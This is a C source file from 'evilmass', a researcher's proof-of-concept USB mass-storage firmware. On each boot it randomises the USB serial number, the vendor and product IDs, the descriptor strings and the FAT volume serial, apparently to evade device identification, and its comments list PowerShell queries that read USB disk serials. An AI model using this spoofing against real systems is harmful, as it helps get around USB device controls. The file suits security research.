/*
evilmass - MIT License - Copyright 2020
-
David Reguera Garcia aka Dreg - dreg@fr33project.org
-
http://www.rootkit.es/
http://github.com/David-Reguera-Garcia-Dreg/
http://www.fr33project.org/
-
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
IN THE SOFTWARE.

WARNING! this is a POC, the code is CRAP
*/

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include "eepr.h"


/* RANDOMIZE IN EACH BOOT: VID, PID, Serial Numbers USB, BOOT SERIAL ...

    Get-CimInstance -ClassName Win32_DiskDrive -Property *  | where{$_.Interfacetype -eq 'USB'} | Select-Object SerialNumber

    Show all info:

    Get-CimInstance -ClassName Win32_Volume -Property *  | where{$_.DriveType -eq 2}

    Get-CimInstance -ClassName Win32_DiskDrive -Property *  | where{$_.Interfacetype -eq 'USB'}


*/

uint8_t myrand(void)
{
    static uint8_t cur;
    //32 bit random number, from noinit sram
    static uint32_t random31 __attribute__((section(".noinit")));
    //temp storage for random number
    uint32_t temp;
    temp = random31 << 1;
    //if bit31 set, or if init sram happens to be 0
    if ((temp & 0x80000000) || (temp == 0))
    {
        //xor magic number (taps)
        temp ^= 0x20AA95B5;
    }
    //save back to random number for next time
    random31 = temp;
    //return lowest byte only
    return temp + cur++;
}



/*
RANDOMIZE IN EACH BOOT USB Serial Number

Powershell:

Get-CimInstance -ClassName Win32_DiskDrive -Property *  | where{$_.Interfacetype -eq 'USB'} | Select-Object SerialNumber

Show all info:

Get-CimInstance -ClassName Win32_Volume -Property *  | where{$_.DriveType -eq 2}

Get-CimInstance -ClassName Win32_DiskDrive -Property *  | where{$_.Interfacetype -eq 'USB'}

*/



void lufa_hook_usb_serialnumber_randomize(uint16_t* serial_str,
        size_t nr_elements)
{
    if (eppr_vars.curr_stage == STAG_ONLYMASS)
    {
        return;
    }
    static bool init;
    static uint8_t charset[0x10];
    if (!init)
    {
        init = true;
        for (size_t i = 0; i < sizeof(charset); i++)
        {
            charset[i] = (myrand() % ('9' + 1 - '1')) + '1';
        }

    }
    for (size_t i = 0; i < nr_elements; i++)
    {
        serial_str[i] = charset[i % sizeof(charset)];
    }
}

void(*LUFA_DREG_HOOK_INTERNAL_SERIAL)(uint16_t* serial_str,
                                      size_t nr_elements) = lufa_hook_usb_serialnumber_randomize;

void scsi_hook_productvendor_id_randomize(uint8_t vendor_id[8],
        uint8_t product_id[16])
{
    if (eppr_vars.curr_stage == STAG_ONLYMASS)
    {
        return;
    }
    static bool init;
    static uint8_t charset[0x10];
    if (!init)
    {
        init = true;
        for (size_t i = 0; i < sizeof(charset); i++)
        {
            charset[i] = (myrand() % ('Z' + 1 - 'A')) + 'A';
        }

    }

    char* vendor_ptr = strstr((char*)vendor_id, "RNN");
    if (NULL != vendor_ptr)
    {
        int i = 0;
        while (*vendor_ptr != '\0')
        {
            *vendor_ptr = charset[i % sizeof(charset)];
            vendor_ptr++;
            i++;
        }
    }
    char* product_ptr = strstr((char*)product_id, "RNN");
    if (NULL != product_ptr)
    {
        int i = 0;
        while (*product_ptr != '\0')
        {
            *product_ptr = charset[(i + 5) % sizeof(charset)];
            product_ptr++;
            i++;
        }
    }
}

void(*SCSI_DREG_HOOK_VENDORPRODUCT_ID)(uint8_t vendor_id[8],
                                       uint8_t product_id[16]) = scsi_hook_productvendor_id_randomize;

void usb_decriptor_hook_manufact_prod(wchar_t* Manufacturer_Product)
{
    if (eppr_vars.curr_stage == STAG_ONLYMASS)
    {
        return;
    }
    static bool init;
    static uint8_t charset[0x10];
    if (!init)
    {
        init = true;
        for (size_t i = 0; i < sizeof(charset); i++)
        {
            charset[i] = (myrand() % ('z' + 1 - 'a')) + 'a';
        }
    }
    int i = 0;
    bool start_ran = false;
    while (*Manufacturer_Product != 0)
    {
        if ('R' == *Manufacturer_Product)
        {
            start_ran = true;
        }
        if (start_ran)
        {
            *Manufacturer_Product = charset[i % sizeof(charset)];
        }
        Manufacturer_Product++;
        i++;
    }
}

void(*USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC)(wchar_t* Manufacturer_Product) =
    usb_decriptor_hook_manufact_prod;

void usb_decriptor_hook_productvendorid(uint16_t* vendor_id,
                                        uint16_t* product_id)
{
    if (eppr_vars.curr_stage == STAG_ONLYMASS)
    {
        return;
    }
    static uint16_t vendor_id_rand;
    static uint16_t product_id_rand;

    if (vendor_id_rand == 0)
    {
        vendor_id_rand = *vendor_id;
    }

    if (product_id_rand == 0)
    {
        product_id_rand = (*product_id) + (myrand() % 0x0100) + 1;
    }

    *vendor_id = vendor_id_rand;
    *product_id = product_id_rand;
}

void(*USBDESCRITPOR_DREG_HOOK_PRODUCTVENDORID)(uint16_t* vendor_id,
        uint16_t* product_id) = usb_decriptor_hook_productvendorid;

struct fat_boot
{
    uint8_t jump[3];
    char    oemId[8];
    uint16_t bytesPerSector;
    uint8_t  sectorsPerCluster;
    uint16_t reservedSectorCount;
    uint8_t  fatCount;
    uint16_t rootDirEntryCount;
    uint16_t totalSectors16;
    uint8_t  mediaType;
    uint16_t sectorsPerFat16;
    uint16_t sectorsPerTrack;
    uint16_t headCount;
    uint32_t hidddenSectors;
    uint32_t totalSectors32;
    uint8_t  driveNumber;
    uint8_t  reserved1;
    uint8_t  bootSignature;
    uint32_t volumeSerialNumber;
    char     volumeLabel[11];
    char     fileSystemType[8];
    uint8_t  bootCode[448];
    uint8_t  bootSectorSig0;
    uint8_t  bootSectorSig1;
};

void hook_boot_record(uint8_t boot_sector[512])
{
    if (eppr_vars.curr_stage == STAG_ONLYMASS)
    {
        return;
    }
    static uint32_t boot_serial_rand = 0;
    struct fat_boot* fat_boot = (struct fat_boot*) boot_sector;
    //printf("boot sector signature: 0x%lX\n", fat_boot->volumeSerialNumber);

    if (0 == boot_serial_rand)
    {
        boot_serial_rand = (myrand() % (0xBEBACAFE + 1 - 0xCEDACAFE)) + 0xCEDACAFE;
    }

    fat_boot->volumeSerialNumber = boot_serial_rand;
}

void(*DREG_HOOK_BOOT_RECORD)(uint8_t boot_sector[512]) = hook_boot_record;

